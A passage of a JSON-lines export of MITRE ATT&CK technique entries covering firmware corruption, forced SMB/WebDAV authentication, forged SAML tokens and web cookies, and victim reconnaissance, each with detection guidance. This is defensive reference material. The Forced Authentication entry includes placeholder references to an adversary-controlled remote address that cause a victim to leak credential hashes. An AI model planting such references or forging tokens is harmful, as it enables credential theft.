2014)","platforms":"Windows","data sources":"Active Directory: Active Directory Object Modification, Command: Command Execution, File: File Metadata, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1222","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Microsoft PLATINUM April 2016),(Citation: LogRhythm WannaCry),(Citation: Sophos New Ryuk Attack October 2020),(Citation: ESET Grandoreiro April 2020),(Citation: ANSSI RYUK RANSOMWARE),(Citation: Crowdstrike Indrik November 2018),(Citation: NCC Group WastedLocker June 2020),(Citation: Cisco CaddyWiper March 2022),(Citation: Microsoft BlackCat Jun 2022),"}
{"ID":"T1495","name":"Firmware Corruption","description":"Adversaries may overwrite or corrupt the flash memory contents of system BIOS or other firmware in devices attached to a system in order to render them inoperable or unable to boot, thus denying the availability to use the devices and/or the system.(Citation: Symantec Chernobyl W95.CIH) Firmware is software that is loaded and executed from non-volatile memory on hardware devices in order to initialize and manage device functionality. These devices may include the motherboard, hard drive, or video cards.\n\nIn general, adversaries may manipulate, overwrite, or corrupt firmware in order to deny the use of the system or devices. For example, corruption of firmware responsible for loading the operating system for network devices may render the network devices inoperable.(Citation: dhs_threat_to_net_devices)(Citation: cisa_malware_orgs_ukraine) Depending on the device, this attack may also result in [Data Destruction](https://attack.mitre.org/techniques/T1485). ","url":"https://attack.mitre.org/techniques/T1495","created":"12 April 2019","last modified":"31 August 2022","version":"1.2","tactics":"Impact","detection":"System firmware manipulation may be detected.(Citation: MITRE Trustworthy Firmware Measurement) Log attempts to read/write to BIOS and compare against known patching behavior.","platforms":"Linux, Network, Windows, macOS","data sources":"Firmware: Firmware Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":"Availability","effective permissions":null,"relationship citations":"(Citation: Secure List Bad Rabbit),(Citation: Eclypsium Trickboot December 2020),"}
{"ID":"T1187","name":"Forced Authentication","description":"Adversaries may gather credential material by invoking or forcing a user to automatically provide authentication information through a mechanism in which they can intercept.\n\nThe Server Message Block (SMB) protocol is commonly used in Windows networks for authentication and communication between systems for access to resources and file sharing. When a Windows system attempts to connect to an SMB resource it will automatically attempt to authenticate and send credential information for the current user to the remote system. (Citation: Wikipedia Server Message Block) This behavior is typical in enterprise environments so that users do not need to enter credentials to access network resources.\n\nWeb Distributed Authoring and Versioning (WebDAV) is also typically used by Windows systems as a backup protocol when SMB is blocked or fails. WebDAV is an extension of HTTP and will typically operate over TCP ports 80 and 443. (Citation: Didier Stevens WebDAV Traffic) (Citation: Microsoft Managing WebDAV Security)\n\nAdversaries may take advantage of this behavior to gain access to user account hashes through forced SMB/WebDAV authentication. An adversary can send an attachment to a user through spearphishing that contains a resource link to an external server controlled by the adversary (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)), or place a specially crafted file on navigation path for privileged accounts (e.g. .SCF file placed on desktop) or on a publicly accessible share to be accessed by victim(s). When the user's system accesses the untrusted resource it will attempt authentication and send information, including the user's hashed credentials, over SMB to the adversary controlled server. (Citation: GitHub Hashjacking) With access to the credential hash, an adversary can perform off-line [Brute Force](https://attack.mitre.org/techniques/T1110) cracking to gain access to plaintext credentials. (Citation: Cylance Redirect to SMB)\n\nThere are several different ways this can occur. (Citation: Osanda Stealing NetNTLM Hashes) Some specifics from in-the-wild use include:\n\n* A spearphishing attachment containing a document with a resource that is automatically loaded when the document is opened (i.e. [Template Injection](https://attack.mitre.org/techniques/T1221)). The document can include, for example, a request similar to <code>file[:]//[remote address]/Normal.dotm</code> to trigger the SMB request. (Citation: US-CERT APT Energy Oct 2017)\n* A modified .LNK or .SCF file with the icon filename pointing to an external reference such as <code>\\\\[remote address]\\pic.png</code> that will force the system to load the resource when the icon is rendered to repeatedly gather credentials. (Citation: US-CERT APT Energy Oct 2017)","url":"https://attack.mitre.org/techniques/T1187","created":"16 January 2018","last modified":"19 June 2020","version":"1.2","tactics":"Credential Access","detection":"Monitor for SMB traffic on TCP ports 139, 445 and UDP port 137 and WebDAV traffic attempting to exit the network to unknown external systems. If attempts are detected, then investigate endpoint data sources to find the root cause. For internal traffic, monitor the workstation-to-workstation unusual (vs. baseline) SMB traffic. For many networks there should not be any, but it depends on how systems on the network are configured and where resources are located.\n\nMonitor creation and modification of .LNK, .SCF, or any other files on systems and within virtual environments that contain resources that point to external network resources as these could be used to gather credentials when the files are rendered. (Citation: US-CERT APT Energy Oct 2017)","platforms":"Windows","data sources":"File: File Access, File: File Creation, File: File Modification, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Sudhanshu Chauhan, @Sudhanshu_C; Teodor Cimpoesu","permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Unit 42 Phishery Aug 2018),(Citation: MSTIC Nobelium Toolset May 2021),(Citation: US-CERT TA18-074A),(Citation: Gigamon Berserk Bear October 2021),(Citation: US-CERT APT Energy Oct 2017),(Citation: US-CERT SMB Security)"}
{"ID":"T1606","name":"Forge Web Credentials","description":"Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.\n\nAdversaries may generate these credential materials in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539), [Steal Application Access Token](https://attack.mitre.org/techniques/T1528), and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users. The generation of web credentials often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.(Citation: GitHub AWS-ADFS-Credential-Generator) Adversaries may also forge tokens by taking advantage of features such as the `AssumeRole` and `GetFederationToken` APIs in AWS, which allow users to request temporary security credentials.(Citation: AWS Temporary Security Credentials)\n\nOnce forged, adversaries may use these web credentials to access resources (ex: [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)(Citation: Microsoft SolarWinds Customer Guidance)  ","url":"https://attack.mitre.org/techniques/T1606","created":"17 December 2020","last modified":"04 May 2023","version":"1.3","tactics":"Credential Access","detection":"Monitor for anomalous authentication activity, such as logons or other user session activity associated with unknown accounts. Monitor for unexpected and abnormal access to resources, including access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations.","platforms":"Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","data sources":"Logon Session: Logon Session Creation, Web Credential: Web Credential Creation, Web Credential: Web Credential Usage","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Dylan Silva, AWS Security","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: Crowdstrike AWS User Federation Persistence),(Citation: FireEye ADFS),(Citation: Microsoft SolarWinds Customer Guidance)"}
{"ID":"T1606.002","name":"Forge Web Credentials: SAML Tokens","description":"An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate.(Citation: Microsoft SolarWinds Steps) The default lifetime of a SAML token is one hour, but the validity period can be specified in the <code>NotOnOrAfter</code> value of the <code>conditions ...</code> element in a token. This value can be changed using the <code>AccessTokenLifetime</code> in a <code>LifetimeTokenPolicy</code>.(Citation: Microsoft SAML Token Lifetimes) Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.(Citation: Cyberark Golden SAML)\n\nAn adversary may utilize [Private Keys](https://attack.mitre.org/techniques/T1552/004) to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate.(Citation: Microsoft SolarWinds Customer Guidance) This differs from [Steal Application Access Token](https://attack.mitre.org/techniques/T1528) and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.\n\nAn adversary may gain administrative Azure AD privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to [Use Alternate Authentication Material](https://attack.mitre.org/techniques/T1550), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Microsoft SolarWinds Customer Guidance)","url":"https://attack.mitre.org/techniques/T1606/002","created":"17 December 2020","last modified":"20 September 2021","version":"1.2","tactics":"Credential Access","detection":"This technique may be difficult to detect as SAML tokens are signed by a trusted certificate. The forging process may not be detectable since it is likely to happen outside of a defender's visibility, but subsequent usage of the forged token may be seen. Monitor for anomalous logins using SAML tokens created by a compromised or adversary generated token-signing certificate. These logins may occur on any on-premises resources as well as from any cloud environment that trusts the certificate.(Citation: Microsoft SolarWinds Customer Guidance) Search for logins to service providers using SAML SSO which do not have corresponding 4769, 1200, and 1202 events in the Domain.(Citation: Sygnia Golden SAML)\n\nConsider modifying SAML responses to include custom elements for each service provider. Monitor these custom elements in service provider access logs to detect any anomalous requests.(Citation: Sygnia Golden SAML)","platforms":"Azure AD, Google Workspace, IaaS, Office 365, SaaS, Windows","data sources":"Logon Session: Logon Session Creation, Logon Session: Logon Session Metadata, User Account: User Account Authentication, Web Credential: Web Credential Creation, Web Credential: Web Credential Usage","is sub-technique":true,"sub-technique of":"T1606","defenses bypassed":null,"contributors":"Blake Strom, Microsoft 365 Defender; Jen Burns, HubSpot; Oleg Kolesnikov, Securonix","permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Secureworks IRON RITUAL Profile),(Citation: AADInternals Documentation),(Citation: Microsoft - Customer Guidance on Recent Nation-State Cyber Attacks),(Citation: Mandiant Defend UNC2452 White Paper),(Citation: FireEye ADFS),(Citation: Microsoft SolarWinds Customer Guidance)"}
{"ID":"T1606.001","name":"Forge Web Credentials: Web Cookies","description":"Adversaries may forge web cookies that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies to authenticate and authorize user access.\n\nAdversaries may generate these cookies in order to gain access to web resources. This differs from [Steal Web Session Cookie](https://attack.mitre.org/techniques/T1539) and other similar behaviors in that the cookies are new and forged by the adversary, rather than stolen or intercepted from legitimate users. Most common web applications have standardized and documented cookie values that can be generated using provided tools or interfaces.(Citation: Pass The Cookie) The generation of web cookies often requires secret values, such as passwords, [Private Keys](https://attack.mitre.org/techniques/T1552/004), or other cryptographic seed values.\n\nOnce forged, adversaries may use these web cookies to access resources ([Web Session Cookie](https://attack.mitre.org/techniques/T1550/004)), which may bypass multi-factor and other authentication protection mechanisms.(Citation: Volexity SolarWinds)(Citation: Pass The Cookie)(Citation: Unit 42 Mac Crypto Cookies January 2019)","url":"https://attack.mitre.org/techniques/T1606/001","created":"17 December 2020","last modified":"20 September 2021","version":"1.1","tactics":"Credential Access","detection":"Monitor for anomalous authentication activity, such as logons or other user session activity associated with unknown accounts. Monitor for unexpected and abnormal access to resources, including access of websites and cloud-based applications by the same user in different locations or by different systems that do not match expected configurations.","platforms":"IaaS, Linux, SaaS, Windows, macOS","data sources":"Logon Session: Logon Session Creation, Web Credential: Web Credential Usage","is sub-technique":true,"sub-technique of":"T1606","defenses bypassed":null,"contributors":"Jen Burns, HubSpot","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Volexity SolarWinds),"}
{"ID":"T1592","name":"Gather Victim Host Information","description":"Adversaries may gather information about the victim's hosts that can be used during targeting. Information about hosts may include a variety of details, including administrative data (ex: name, assigned IP, functionality, etc.) as well as specifics regarding its configuration (ex: operating system, language, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about hosts may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).","url":"https://attack.mitre.org/techniques/T1592","created":"02 October 2020","last modified":"17 October 2021","version":"1.1","tactics":"Reconnaissance","detection":"Internet scanners may be used to look for patterns associated with malicious content designed to collect host information from visitors.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: ATT ScanBox)\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":"Internet Scan: Response Content","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1592.004","name":"Gather Victim Host Information: Client Configurations","description":"Adversaries may gather information about the victim's client configurations that can be used during targeting. Information about client configurations may include a variety of details and settings, including operating system/version, virtualization, architecture (ex: 32 or 64 bit), language, and/or time zone.\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the client configurations may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).","url":"https://attack.mitre.org/techniques/T1592/004","created":"02 October 2020","last modified":"17 October 2021","version":"1.1","tactics":"Reconnaissance","detection":"Internet scanners may be used to look for patterns associated with malicious content designed to collect client configuration information from visitors.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: ATT ScanBox)\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":"Internet Scan: Response Content","is sub-technique":true,"sub-technique of":"T1592","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Microsoft HAFNIUM March 2020),"}
{"ID":"T1592.003","name":"Gather Victim Host Information: Firmware","description":"Adversaries may gather information about the victim's host firmware that can be used during targeting. Information about host firmware may include a variety of details such as type and versions on specific hosts, which may be used to infer more information about hosts in the environment (ex: configuration, purpose, age/patch level, etc.).\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about host firmware may only be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices).(Citation: ArsTechnica Intel) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [Exploit Public-Facing Application](https://attack.mitre.org/techniques/T1190)).","url":"https://attack.mitre.org/techniques/T1592/003","created":"02 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1592","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1592.001","name":"Gather Victim Host Information: Hardware","description":"Adversaries may gather information about the victim's host hardware that can be used during targeting. Information about hardware infrastructure may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: card/biometric readers, dedicated encryption hardware, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: hostnames, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the hardware infrastructure may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or initial access (ex: [Compromise Hardware Supply Chain](https://attack.mitre.org/techniques/T1195/003) or [Hardware Additions](https://attack.mitre.org/techniques/T1200)).","url":"https://attack.mitre.org/techniques/T1592/001","created":"02 October 2020","last modified":"17 October 2021","version":"1.1","tactics":"Reconnaissance","detection":"Internet scanners may be used to look for patterns associated with malicious content designed to collect host hardware information from visitors.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: ATT ScanBox)\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":"Internet Scan: Response Content","is sub-technique":true,"sub-technique of":"T1592","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1592.002","name":"Gather Victim Host Information: Software","description":"Adversaries may gather information about the victim's host software that can be used during targeting. Information about installed software may include a variety of details such as types and versions on specific hosts, as well as the presence of additional components that might be indicative of added defensive protections (ex: antivirus, SIEMs, etc.).\n\nAdversaries may gather this information in various ways, such as direct collection actions via [Active Scanning](https://attack.mitre.org/techniques/T1595) (ex: listening ports, server banners, user agent strings) or [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then include malicious content designed to collect host information from visitors.(Citation: ATT ScanBox) Information about the installed software may also be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices). Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Search Open Technical Databases](https://attack.mitre.org/techniques/T1596)), establishing operational resources (ex: [Develop Capabilities](https://attack.mitre.org/techniques/T1587) or [Obtain Capabilities](https://attack.mitre.org/techniques/T1588)), and/or for initial access (ex: [Supply Chain Compromise](https://attack.mitre.org/techniques/T1195) or [External Remote Services](https://attack.mitre.org/techniques/T1133)).","url":"https://attack.mitre.org/techniques/T1592/002","created":"02 October 2020","last modified":"17 October 2021","version":"1.1","tactics":"Reconnaissance","detection":"Internet scanners may be used to look for patterns associated with malicious content designed to collect host software information from visitors.(Citation: ThreatConnect Infrastructure Dec 2020)(Citation: ATT ScanBox)\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":"Internet Scan: Response Content","is sub-technique":true,"sub-technique of":"T1592","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: TrendMicro New Andariel Tactics July 2018),(Citation: Google Iran Threats October 2021),"}
{"ID":"T1589","name":"Gather Victim Identity Information","description":"Adversaries may gather information about the victim's identity that can be used during targeting. Information about identities may include a variety of details, including personal data (ex: employee names, email addresses, etc.) as well as sensitive details such as credentials.\n\nAdversaries may gather this information in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Information about users could also be enumerated via other active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)) such as probing and analyzing responses from authentication services that may reveal valid usernames in a system.(Citation: GrimBlog UsernameEnum) Information about victims may also be exposed to adversaries via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak)(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks)\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).","url":"https://attack.mitre.org/techniques/T1589","created":"02 October 2020","last modified":"21 April 2022","version":"1.2","tactics":"Reconnaissance","detection":"Monitor for suspicious network traffic that could be indicative of probing for user information, such as large/iterative quantities of authentication requests originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":"Network Traffic: Network Traffic Content","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Jannie Li, Microsoft Threat Intelligence Center (MSTIC)","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ClearSky Lazarus Aug 2020),(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: ClearSky Siamesekitten August 2021),(Citation: Proofpoint TA453 July2021),(Citation: FoxIT Wocao December 2019),(Citation: MSTIC DEV-0537 Mar 2022),"}
{"ID":"T1589.001","name":"Gather Victim Identity Information: Credentials","description":"Adversaries may gather credentials that can be used during targeting. Account credentials gathered by adversaries may be those directly associated with the target victim organization or attempt to take advantage of the tendency for users to use the same passwords across personal and business accounts.\n\nAdversaries may gather credentials from potential victims in various ways, such as direct elicitation via [Phishing for Information](https://attack.mitre.org/techniques/T1598). Adversaries may also compromise sites then add malicious content designed to collect website authentication cookies from visitors.(Citation: ATT ScanBox) Credential information may also be exposed to adversaries via leaks to online or other accessible data sets (ex: [Search Engines](https://attack.mitre.org/techniques/T1593/002), breach dumps, code repositories, etc.).(Citation: Register Deloitte)(Citation: Register Uber)(Citation: Detectify Slack Tokens)(Citation: Forbes GitHub Creds)(Citation: GitHub truffleHog)(Citation: GitHub Gitrob)(Citation: CNET Leaks) Adversaries may also purchase credentials from dark web or other black-markets. Finally, where multi-factor authentication (MFA) based on out-of-band communications is in use, adversaries may compromise a service provider to gain access to MFA codes and one-time passwords (OTP).(Citation: Okta Scatter Swine 2022)\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [External Remote Services](https://attack.mitre.org/techniques/T1133) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)). ","url":"https://attack.mitre.org/techniques/T1589/001","created":"02 October 2020","last modified":"14 April 2023","version":"1.1","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1589","defenses bypassed":null,"contributors":"Lee Christensen, SpecterOps; Toby Kohlenberg; Vinayak Wadhwa, Lucideus","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: NCC Group Chimera January 2021),(Citation: CrowdStrike StellarParticle January 2022),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: CISA AA21-200A APT40 July 2021),(Citation: IBM ITG18 2020),(Citation: Microsoft Targeting Elections September 2020),(Citation: MSTIC DEV-0537 Mar 2022),"}
{"ID":"T1589.002","name":"Gather Victim Identity Information: Email Addresses","description":"Adversaries may gather email addresses that can be used during targeting. Even if internal instances exist, organizations may have public-facing email infrastructure and addresses for employees.\n\nAdversaries may easily gather email addresses, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: HackersArise Email)(Citation: CNET Leaks) Email addresses could also be enumerated via more active means (i.e. [Active Scanning](https://attack.mitre.org/techniques/T1595)), such as probing and analyzing responses from authentication services that may reveal valid usernames in a system.(Citation: GrimBlog UsernameEnum) For example, adversaries may be able to enumerate email addresses in Office 365 environments by querying a variety of publicly available API endpoints, such as autodiscover and GetCredentialType.(Citation: GitHub Office 365 User Enumeration)(Citation: Azure Active Directory Reconnaisance)\n\nGathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Email Accounts](https://attack.mitre.org/techniques/T1586/002)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Brute Force](https://attack.mitre.org/techniques/T1110) via [External Remote Services](https://attack.mitre.org/techniques/T1133)).","url":"https://attack.mitre.org/techniques/T1589/002","created":"02 October 2020","last modified":"21 October 2022","version":"1.2","tactics":"Reconnaissance","detection":"Monitor for suspicious network traffic that could be indicative of probing for email addresses and/or usernames, such as large/iterative quantities of authentication requests originating from a single source (especially if the source is known to be associated with an adversary/botnet). Analyzing web metadata may also reveal artifacts that can be attributed to potentially malicious activity, such as referer or user-agent string HTTP/S fields.\n\nMuch of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":"Network Traffic: Network Traffic Content","is sub-technique":true,"sub-technique of":"T1589","defenses bypassed":null,"contributors":"Jannie Li, Microsoft Threat Intelligence Center (MSTIC)","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Malwarebytes Kimsuky June 2021),(Citation: Anomali Static Kitten February 2021),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: AADInternals Documentation),(Citation: Azure AD Recon),(Citation: Amnesty Intl. Ocean Lotus February 2021),(Citation: ClearSky Siamesekitten August 2021),(Citation: Volexity Exchange Marauder March 2021),(Citation: SecureWorks August 2019),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: Proofpoint TA453 July2021),(Citation: DOJ Iran Indictments March 2018),(Citation: Google Iran Threats October 2021),(Citation: Google EXOTIC LILY March 2022),(Citation: Unit 42 TA551 Jan 2021),(Citation: MSTIC DEV-0537 Mar 2022),"}
{"ID":"T1589.003","name":"Gather Victim Identity Information: Employee Names","description":"Adversaries may gather employee names that can be used during targeting. Employee names be used to derive email addresses as well as to help guide other reconnaissance efforts and/or craft more-believable lures.\n\nAdversaries may easily gather employee names, since they may be readily available and exposed via online or other accessible data sets (ex: [Social Media](https://attack.mitre.org/techniques/T1593/001) or [Search Victim-Owned Websites](https://attack.mitre.org/techniques/T1594)).(Citation: OPM Leak) Gathering this information may reveal opportunities for other forms of reconnaissance (ex: [Search Open Websites/Domains](https://attack.mitre.org/techniques/T1593) or [Phishing for Information](https://attack.mitre.org/techniques/T1598)), establishing operational resources (ex: [Compromise Accounts](https://attack.mitre.org/techniques/T1586)), and/or initial access (ex: [Phishing](https://attack.mitre.org/techniques/T1566) or [Valid Accounts](https://attack.mitre.org/techniques/T1078)).","url":"https://attack.mitre.org/techniques/T1589/003","created":"02 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Reconnaissance","detection":"Much of this activity may have a very high occurrence and associated false positive rate, as well as potentially taking place outside the visibility of the target organization, making detection difficult for defenders.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access.","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1589","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: KISA Operation Muzabi),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: DOJ Iran Indictments March 2018),"}
